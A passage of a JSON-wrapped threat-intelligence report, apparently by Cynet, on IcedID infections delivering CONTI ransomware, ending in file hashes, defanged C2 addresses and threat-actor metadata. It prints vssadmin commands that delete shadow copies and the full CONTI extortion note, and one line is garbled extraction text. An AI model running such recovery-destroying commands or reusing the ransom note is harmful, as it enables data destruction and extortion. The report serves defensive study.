Cynet’s Decoy Files mechanism, which is part of our Advanced Ransomware Heuristics detection mechanism, we can detect and\nprevent attempts to encrypt files by CONTI ransomware:\n\n\\device\\harddiskvolume4\\*\\29.xlsx.ahiod\n\\device\\harddiskvolume4\\*\\10.jpg.ahiod\n\n\\device\\harddiskvolume4\\*\\14.xlsx.ahiod\n\n\\device\\harddiskvolume4\\*\\15.jpg.ahiod\n\n\\device\\harddiskvolume4\\*\\19.xlsx.ahiod\n\n\\device\\harddiskvolume4\\*\\2.docx.ahiod\n\n\\device\\harddiskvolume4\\*\\20.jpg.ahiod\n\n\\device\\harddiskvolume4\\*\\24.xlsx.ahiod\n\n\\device\\harddiskvolume4\\*\\25.jpg.ahiod\n\n\\device\\harddiskvolume4\\*\\28.xls.ahiod\n\nAdditional example of CONTI ransomware encrypted files and the ransomware note\n\nCONTI utilizes Windows Restart Manager to ensure the data files are ready for encryption and there is no open handles to the targeted files\nby other processes, and if so, the CONTI ransomware terminates these processes. The same technique is used by Sodinokibi (A.K.A REvil)\nand Ryuk ransomware.\n\nInhibiting recovery commands detected during CONTI infection preventing system recovery by deleting volume shadow copies using\nvssadmin commands.\n\nvssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB\nvssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=unbounded\n\nvssadmin.exe delete shadows /all /quiet\n\nThe threat actors executed the shadow copy deletion commands manually in most cases through .bat files. This action of deleting shadow\ncopies, not via the ransomware functionality itself, is a new development in recent incidents.\n\nWe suspect that this action was performed manually to impede the detection of the inhibiting recovery technique. The shadow copy deletion\ncommands are not directly related to the ransomware activity in this execution method and are similar to legitimate activity originated from\nadministrators and third party applications.\n\nCONTI Ransomware note:\n\nReadme.txt\n\n\n-----\n\nAll of your files are currently encrypted by CONTI strain.\nAs you know (if you don’t – just “google it”), all of the data that has been encrypted by our software cannot be recovered by any means\nwithout contacting our team directly.\n\nIf you try to use any additional recovery software – the files might be damaged, so if you are willing to try – try it on the data of the lowest\nvalue.\n\nTo make sure that we REALLY CAN get your data back – we offer you to decrypt 2 random files completely free of charge.\n\nYou can contact our team directly for further instructions through our website :\n\nTOR VERSION :\n\n(you should download and install TOR browser first https://torproject.org)\n\nhttp://conti____________________________________________.onion/\n\nHTTPS VERSION :\n\nhttps://contirecovery.top/\n\nYOU SHOULD BE AWARE!\n\nJust in case, if you try to ignore us. We’ve downloaded a pack of your internal data and are ready to publish it on out news website if you\ndo not respond. So it will be better for both sides if you contact us as soon as possible.\n\n—BEGIN ID—\n\n____________________________________________\n\n—END ID—\n\nThe CONTI group recently started using a “double extortion” technique, threatening victims that the exfiltrated data will be publicly leaked.\nThis is a new trend amongst threat actors that used to focus ransomware campaigns and attacks solely on data encryption but have evolved\nand created an additional leverage and source of income.\n\nYOU SHOULD BE AWARE!\nJust in case, if you try to ignore us. We’ve downloaded a pack of your internal data and are ready to publish it on our news website if you\ndo not respond. So it will be better for both sides if you contact us as soon as possible.\n\n## Conclusion\n\nAs part of this extensive research, we’ve observed a cooperation pattern amongst threat groups. Specifically, a high number of IcedID\ninfections utilizing Cobalt Strike beacons and ultimately attempting to encrypt hosts using CONTI ransomware.\n\nAttackers enhance and tune their mean of operations and their control over every step of their campaigns. Splitting their attacks while utilizing\ndifferent payloads which in turn enable them to better evade security solutions and demonstrating total awareness and control over the target\nenvironment.\n\nIn other words, two different independent malwares, developed by two different attack groups – are collaborating to download, spread and\ninfect compromised organizations with ransomware.\n\n\n-----\n\ns o t e t a access, t see s e t e good o d p s g / spea p s g st e a s t e a o ab e t a access et od o t eat acto s\nand for a good reason as current number suggest that 97% of attacks begin with this method which seem to trick and lure even technical\nprofessional as well as security-oriented personnel.\n\nAnother alarming observation which raises many concerns is the fact that threat actors which seemed to avoid targeting the healthcare sector\nare no longer following this code of conduct and we see a rise in attacks against Hospitals, Health clinics, Pharmacies etc. among these\nthreat actors you can find Wizard Spider as well as Lunar Spider.\nAccording to previous knowledge, the Russian group “Wizard Spider”, which is related to the splinter groups “Grim Spider” and “Lunar\nSpider”, is behind numerous attacks against this type of targets.\nWizard Spider threat group is the Russia-based operator of the TrickBot banking malware, which has primarily focused on wire fraud in the\npast.\nThe HSE and Department of Health confirmed that The National Cyber Security Centre, along with the Gardaí and the Defense Forces, is\ncurrently investigating few very serious cyber-attacks.\nThe groups are also wanted by the FBI, the UK’s National Crime Agency, Interpol, and Europol.\nAnd, as this article demonstrates, IcedID, developed by Lunar Spider, is primarily used to steal and exfiltrate financial information, is now\nbeing used as a downloader to distribute Conti Ransomware, developed by Wizard Spider, to compromised organizations.\n\nAdditionally, in most if not all recent attacks and campaigns, we’ve observed the same MO where threat actors turn to the fairly new “Double\nextortion” technique in which they not only get hold of the victims assets and demand Ransome for their decryption, but also exfiltrating data\nand threatening the victim that if the Ransome won’t be paid, the data, IP, customer information and other exfiltrated data will be sold or\npublished to the public.\nThese findings and observations are possible due to Cynet’s multiple layers and mechanisms allowing enhanced detection, prevention and\nvisibility over such attack attempts while enabling security teams and professionals to better examine and understand each step and respond\naccordingly.\n\n## IOC\n\nIcedID DLL Payloads:\n\n0ef2a73bd5e1d545596b1769503461b809793371bbaedb03f852648eafcfef1e\nce0767c640f01062a939183daa3634db74237fceb9f264a0eeeec80097ca5d98\n\ned08f3f83b79a358b698b477a62aafc902910b179c87126e6afc7267204bd018\n\n902eb3ddc744189404b2465ab8a5a4caa3e2a30b2db5c40570d0b35b8ee4c45b\n\n47c5683cc8cc1c4977af013b5e09b0ec50f610fff820036544c2a5ca5da7686a\n\n6c34b5e0d401f4a9185580e57071995e579a645ead57ae4b280ef8f9a0ff2b30\n\nc21ad5068d4172fd6348578fd493bc717e09d30006862345a2672894aaaa24b7\n\n97341cd0f8c3df8a350be026ce2257c5d99a6df4dd1572b4bbc3ccf996d9e745\n\nb9337eb2ec474402ad98bad94262483c2b5cec3752b11e3d1ed780e78d331d78\n\nb4bd414baa9dea1be8d9b8f690d35aa161e1e533cedbaa6562f2f32e9bc64ae3\n\nIcedID maldocs:\n\nf84d65ddf6a721ee4343db90c97dc1e12b8cf79677bd2d9ddc9a703903a4271b\n3fd1127d196f1b993a876d8c0c3d3217a800cb605eaa4cca1316a5f3a046069d\n\n677dbb3d766eb72cbaf57720f8d7895e2569c209e9b11f820811d8df19c63e7a\n\nf578d6e7fc4d204ef17549be7ea8f3b6bca4b4103e7afff483b180f95f818a20\n\n590eac4ef1f146780c39696f31c3e14300c4a9145743d282afe48c4e93cbd0c4\n\n2f4193a77175cf0c173f556840b1d36cabbc1e0104d11a3f4c629fe02c915a43\n\nc75429e288d5348c887ac63ff2703d2c44ceb719c74703c6307f5514e2fe7cfcg\n\nb5e15015b24691a3a19700152dd14dbaca7d7bd27e7d7e84db07a5ae22de1cd3 bb4e0e7d72a40b0b7801a7bcf7a6e11d4263191fa0cc378351d5\n\n7215e503b77bdd7fd48b5f63cbce288bf0caa00ed5688bc9b810cb51ed3a765a\n\n976a009ed5b0df798bf38b6c3d021abc70ba8a1f18a44b678ea5bc32e17edb0d\n\n25368ee6e7d6c2f666080dcc0ec72dab4fb3c5d4756e41d7533d54611df5a485\n\n\n-----\n\nIcedID C2:\n\n74[.]119[.]193[.]206\n195[.]123[.]208[.]151\n\n188[.]127[.]227[.]146\n\n185[.]212[.]129[.]164\n\n82[.]146[.]48[.]116\n\n190[.]14[.]37[.]143\n\n190[.]14[.]37[.]248\n\n185[.]212[.]129[.]66\n\n37[.]46[.]133[.]194\n\nCONTI ransomware DLLs:\n\n5fe77db174a5206b5387e2b86255bd008966b44632925351d9b3983438004eb1\na5751a46768149c5ddf318fd75afc66b3db28a5b76254ee0d6ae27b21712e266\n\ne07316969b2d2941e9ec6a940d03d03bd36527dae825f30265fd5221a858fca4\n\n7f9d02ceaf4daa901fbb59648e599a381afd93bcba1b88fb6b345949b3479eb3\n\nf092b985b75a702c784f0936ce892595b91d025b26f3387a712b76dcc3a4bc81\n\n9826b386065f8312a7a7ef431c735a66e85a9c144692907f5909f81f837c65f4\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-30 - Shelob Moonlight – Spinning a Larger Web From IcedID to CONTI, a Trojan and Ransomware collaboration.pdf"
    ],
    "report_names": [
        "2021-06-30 - Shelob Moonlight – Spinning a Larger Web From IcedID to CONTI, a Trojan and Ransomware collaboration.pdf"
    ],
    "threat_actors": [
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "475ea823-9e47-4098-b235-0900bc1a5362",
            "created_at": "2022-10-25T16:07:24.506596Z",
            "updated_at": "2025-03-27T02:02:10.263346Z",
            "deleted_at": null,
            "main_name": "Lunar Spider",
            "aliases": [
                "Gold SwathMore"
            ],
            "source_name": "ETDA:Lunar Spider",
            "tools": [
                "BokBot",
                "IceID",
                "IcedID",
                "NeverQuest",
                "Vawtrak",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c2385aea-d30b-4dbc-844d-fef465cf3ea9",
            "created_at": "2023-01-06T13:46:38.916521Z",
            "updated_at": "2025-03-27T02:00:02.950071Z",
            "deleted_at": null,
            "main_name": "LUNAR SPIDER",
            "aliases": [
                "GOLD SWATHMORE"
            ],
            "source_name": "MISPGALAXY:LUNAR SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8492b1a0-126f-4113-b8f7-101d28559629",
            "created_at": "2023-01-06T13:46:38.864213Z",
            "updated_at": "2025-03-27T02:00:02.938147Z",
            "deleted_at": null,
            "main_name": "GRIM SPIDER",
            "aliases": [
                "GOLD ULRICK"
            ],
            "source_name": "MISPGALAXY:GRIM SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "53f39e5d-6d69-4402-b03c-ec2dbe045788",
            "created_at": "2024-06-19T02:03:08.132007Z",
            "updated_at": "2025-03-27T02:05:17.401832Z",
            "deleted_at": null,
            "main_name": "GOLD ULRICK",
            "aliases": [
                "UNC1878 ",
                "Grim Spider "
            ],
            "source_name": "Secureworks:GOLD ULRICK",
            "tools": [
                " Buer Loader",
                " Cobalt Strike",
                " Conti",
                " Diavol",
                " Powershell Empire",
                " Ryuk",
                " SystemBC",
                " Team9 (aka BazarLoader)",
                " TrickBot",
                "Bloodhound"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "7cfe3bc9-7a6c-4ee1-a635-5ea7b947147f",
            "created_at": "2024-06-19T02:03:08.122318Z",
            "updated_at": "2025-03-27T02:05:17.398805Z",
            "deleted_at": null,
            "main_name": "GOLD SWATHMORE",
            "aliases": [
                "Lunar Spider "
            ],
            "source_name": "Secureworks:GOLD SWATHMORE",
            "tools": [
                " GlobeImposter",
                " Gozi",
                " Gozi Trojan",
                " IcedID",
                " Latrodectus",
                " TrickBot",
                " TrickBot",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535788,
    "ts_updated_at": 1743041652,
    "ts_creation_date": 1653752202,
    "ts_modification_date": 1653752202,
    "files": {
        "pdf": "https://archive.orkl.eu/bbde6df3e7caec53d524040526b1d9521c682100.pdf",
        "text": "https://archive.orkl.eu/bbde6df3e7caec53d524040526b1d9521c682100.txt",
        "img": "https://archive.orkl.eu/bbde6df3e7caec53d524040526b1d9521c682100.jpg"
    }
}